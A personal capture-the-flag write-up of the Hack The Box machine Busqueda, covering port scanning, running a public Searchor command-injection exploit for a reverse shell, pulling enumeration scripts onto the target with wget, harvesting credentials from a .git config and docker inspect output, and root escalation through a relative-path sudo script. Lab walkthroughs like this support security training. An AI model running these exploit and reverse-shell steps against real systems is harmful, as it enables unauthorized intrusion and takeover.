---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Busqueda?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured:
aliases:
  - Linux
---

---
# Information / Description

![800](../../0.%20Assets/Busqueda-1788730613603.webp)

This one wasn't easy. The foothold was quick, maybe ten minutes, but the privilege escalation was full of rabbit holes.

---

# Walkthrough

Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

With the ports in hand, I'll run a second, more detailed `nmap` scan.

```
nmap -sS -p 22,80 --min-rate 5000 -Pn -n -sVC -oN results.txt -v $T
```

This writes the scan results to a file.

```
┌─[bl1nk㉿kali]─[~/engagements/busqueda/nmap]─[󰦝 10.10.15.150]─[ 10.129.228.217]
└─❯ cat results.txt -l java

   1 │ # Nmap 7.99 scan initiated Sun Sep  6 23:48:42 2026 as: /usr/lib/nmap/nmap --privileged -sS -p 22,80 --min-rate 5000 -Pn -n -sVC -oN results.txt -v 10.129.228.217
   2 │ Nmap scan report for 10.129.228.217
   3 │ Host is up (0.026s latency).
   4 │
   5 │ PORT   STATE SERVICE VERSION
   6 │ 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
   7 │ | ssh-hostkey:
   8 │ |   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
   9 │ |_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
  10 │ 80/tcp open  http    Apache httpd 2.4.52
  11 │ |_http-title: Did not follow redirect to http://searcher.htb/
  12 │ |_http-server-header: Apache/2.4.52 (Ubuntu)
  13 │ | http-methods:
  14 │ |_  Supported Methods: GET HEAD POST OPTIONS
  15 │ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
  16 │
  17 │ Read data files from: /usr/share/nmap
  18 │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  19 │ # Nmap done at Sun Sep  6 23:48:50 2026 -- 1 IP address (1 host up) scanned in 7.72 seconds

```

There isn't much to work with, so let's head to the web server and see what it hosts.

The site doesn't resolve at first, so let's add it to `/etc/hosts` and see if name resolution fixes it.

![](../../0.%20Assets/Busqueda-1788731537507.webp)

We already know the server name from the `nmap` title field, which was kind enough to leak it.

Once the site loads, we see a search tool for engines along with some version disclosure.

![](../../0.%20Assets/Busqueda-1788732635230.webp)

I found this [exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh)

Reading the documentation, all I need to do is start a `netcat` listener on port `9001`, which is the script's default, and then run the script.

```
rlwrap nc -nlvp 9001
```

- I wrapped the `netcat listener` in `rlwrap` to stabilize the shell.

Then I run the script as the documentation describes.

```
./exploit.sh searcher.htb 10.10.15.150 9001
```

![](../../0.%20Assets/Busqueda-1788732986819.webp)

In the `home` directory we find the user flag.

![](../../0.%20Assets/Busqueda-1788733022791.webp)

Using my custom `serve` command, I started a Python web server to transfer `linpeas.sh` and `linux-exploit-suggester.sh` onto the target.

Then from the target:

```
wget http://10.10.15.150/linpeas.sh
wget http://10.10.15.150/linux-exploit-suggester.sh
```

For privilege escalation I looked everywhere without much to show for it, until I came back to the directory we landed in and noticed the `.git` folder.

![](../../0.%20Assets/Busqueda-1788735563837.webp)

Inside it, I found a `config` file.

![](../../0.%20Assets/Busqueda-1788735641485.webp)

It references `gitea.searcher.htb`, so let's add that to `/etc/hosts` for name resolution and hope it leads somewhere.

And there it is.

![|602x473](../../0.%20Assets/Busqueda-1788736111505.webp)

We need to sign in, so let's go looking for credentials.

Inside the `logs` directory under `.git`, we find what looks like a username.

![](../../0.%20Assets/Busqueda-1788736349104.webp)

Let's keep `administrator` in mind.

While fuzzing with `gobuster`, I found that the user `administrator` is reachable directly as a page.

![544](../../0.%20Assets/Busqueda-1788736570669.webp)![|892x389](../../0.%20Assets/Busqueda-1788736702944.webp)

Nothing interesting there.

Browsing the page, I also came across another user named `Cody`.

![](../../0.%20Assets/Busqueda-1788736656512.webp)

Then I realized we'd had Cody's credentials all along, after spending more than an hour hunting for them.

![](../../0.%20Assets/Busqueda-1788737934074.webp)

Inside, there's a hidden repository.

![](../../0.%20Assets/Busqueda-1788738008060.webp)

I went through it and didn't find anything notable.

Now that we have a credential, let's go back to the machine and try again.

First, let's upgrade to a proper shell.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now let's check our sudo permissions.

```
sudo -l
```

```
svc@busqueda:/var/www/app$ sudo -l                                                                                                       
sudo -l                                                                                                                                  
[sudo] password for svc: jh1usoih2bkjaspwe92                                                                                             
  
Matching Defaults entries for svc on busqueda:                                                                                           
    env_reset, mail_badpass,                                                                                                             
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,                                            
    use_pty                                                                                                                              

User svc may run the following commands on busqueda:                                                                                     
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

We can run a Python script as root, so let's find out what it does.

We can't `cat` the file, so let's just run it.

```
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *                                                        
<o /usr/bin/python3 /opt/scripts/system-checkup.py *                                                                                     
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)                                                                             

     docker-ps     : List running docker containers                                                                                      
     docker-inspect : Inpect a certain docker container                                                                                  
     full-checkup  : Run a full system checkup                                                                                           

svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```

![](../../0.%20Assets/Busqueda-1788738520389.webp)

We can see a couple of docker containers, one that looks like `mysql` and the `gitea` instance itself.

The mapped SSH port caught my eye, so let's see if we can get inside.

![](../../0.%20Assets/Busqueda-1788738936000.webp)

Next I tried the `"docker-inspect"` action.

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' 960873171e2e
```

I'll be honest, I worked out everything up to here on my own, but I had to look up this last command.


![](../../0.%20Assets/Busqueda-1788739131102.webp)


| database | user  | password          |
| -------- | ----- | ----------------- |
| gitea    | gitea | yuiu1hoiu4i5ho1uh |

Let's connect to the database and see what's in there.

I went back and logged in as `Administrator`.

![](../../0.%20Assets/Busqueda-1788740410655.webp)

There I found the source code for the `checkup` script.

`Fullcheckup` hadn't worked for me earlier, so let's revisit it now that we have the source.



![](../../0.%20Assets/Busqueda-1788741074009.webp)

The script revealed a key vulnerability: when executing the `full-checkup` argument, it runs `./full-checkup.sh` using a relative path instead of an absolute path.


```
find / -name full-checkup.sh 2>/dev/null                                                                                                 
/opt/scripts/full-checkup.sh
```

![](../../0.%20Assets/Busqueda-1788741472131.webp)

From there it works.

This tells us the script runs `full-checkup.sh` from the current working directory as `root`. So let's move to a directory we can write to, like `/tmp`, and drop in our own `full-checkup.sh` for root to execute.

I wrote a script that sends me a reverse shell. Since root is the one running it, the shell comes back with root privileges.

![](../../0.%20Assets/Busqueda-1788743147056.webp)

